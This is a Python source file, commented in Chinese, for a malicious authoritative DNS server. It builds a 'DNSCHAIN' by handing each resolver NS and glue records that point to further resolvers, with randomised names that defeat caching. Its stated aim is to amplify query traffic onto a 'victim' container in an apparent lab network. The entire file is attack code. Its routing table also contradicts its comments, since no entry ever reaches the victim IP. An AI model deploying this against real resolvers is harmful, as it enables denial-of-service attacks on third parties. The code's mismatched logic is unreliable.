# 位于 ./auth/contents/intelligent_auth_server.py

from dnslib.server import DNSServer
from dnslib import RR, A, NS, QTYPE, DNSLabel
import random
import time

# --- 配置项 ---
# 这个域名必须和你的unbound.conf里stub-zone的name一致
MY_DOMAIN = "example.com"
# 这个IP必须是victim容器的IP
VICTIM_IP = "10.4.0.4"
# 服务器监听所有接口
MY_IP = "0.0.0.0"
PORT = 53

# --- DNSCHAIN 路由表 ---
# 这是整个攻击的核心逻辑，它精确地映射了你的docker-compose.yml中的IP地址。
# Key:   来源DRS的IP地址
# Value: 下一跳目标DRS的IP地址列表
CHAIN_MAP = {
    # 攻击入口 (任何未知的IP) -> Level 1 DRS
    "default": ["10.4.0.5"],

    # Level 1 DRS -> Level 2 DRSs
    "10.4.0.6": ["10.4.0.7", "10.4.0.9"],

    # 所有 Level 2 DRSs -> 最终受害者 (流量汇集)
    "10.4.0.8": ["10.4.0.5", "10.4.0.6", "10.4.0.9"],
    "10.4.0.10": ["10.4.0.5", "10.4.0.6", "10.4.0.7"],
}

class ChainResolver:
    """
    一个智能DNS解析器，根据请求来源IP动态地返回NS记录，
    从而构建一个DNS解析链 (DNSCHAIN)。
    """
    def resolve(self, request, handler):
        qname = request.q.qname
        qtype = QTYPE[request.q.qtype]
        client_ip = handler.client_address[0]

        # 打印日志，方便我们实时观察攻击链的传递过程
        print(f"[{time.strftime('%H:%M:%S')}] Query for '{qname}' ({qtype}) received from: {client_ip}")

        # 1. 检查域名是否在我们控制之下
        if not qname.matchSuffix(DNSLabel(MY_DOMAIN)):
            print(f" -> Domain does not match. Refusing.")
            reply = request.reply()
            reply.header.rcode = 5 # REFUSED
            return reply

        # 2. 根据来源IP，从路由表中查找下一跳目标
        #    如果IP不在表中，就使用 "default" 路由
        next_hops = CHAIN_MAP.get(client_ip, CHAIN_MAP["default"])
        
        # 打印路由决策日志
        if next_hops[0] == VICTIM_IP:
            print(f" -> Source is a Level 2 DRS. Delegating to FINAL VICTIM: {VICTIM_IP}")
        else:
            print(f" -> Delegating to next level DRSs: {next_hops}")

        # 3. 构造DNS响应
        reply = request.reply()
        
        # 为列表中的每一个下一跳目标生成NS记录和对应的胶水A记录
        for i, next_ip in enumerate(next_hops):
            # 创造一个随机且唯一的NS服务器域名，以绕过潜在的缓存
            ns_prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
            ns_name = f"{ns_prefix}-{i}.ns.{MY_DOMAIN}"
            
            # a. 添加NS记录到"权威"部分 (Authority Section)
            #    告诉客户端，'qname'的权威服务器是'ns_name'
            reply.add_auth(RR(qname, QTYPE.NS, rdata=NS(ns_name), ttl=10))
            
            # b. 添加胶水记录到"附加"部分 (Additional Section)
            #    直接告诉客户端'ns_name'的IP地址是'next_ip'
            reply.add_ar(RR(ns_name, QTYPE.A, rdata=A(next_ip), ttl=10))
        
        # 4. 返回精心构造的响应
        return reply

# --- 主程序入口 ---
if __name__ == '__main__':
    print("="*40)
    print("[*] Starting DNSCHAIN Intelligent Auth Server")
    print(f"[*] Controlling domain: *.{MY_DOMAIN}")
    print(f"[*] Final victim IP: {VICTIM_IP}")
    print("[*] Routing Map:")
    for src, dest in CHAIN_MAP.items():
        print(f"    {src} -> {dest}")
    print("="*40)

    try:
        resolver = ChainResolver()
        server = DNSServer(resolver, port=PORT, address=MY_IP)
        server.start()
    except Exception as e:
        print(f"[!] An error occurred: {e}")
    finally:
        print("\n[*] Server shutting down.")
        if 'server' in locals() and server.is_running():
            server.stop()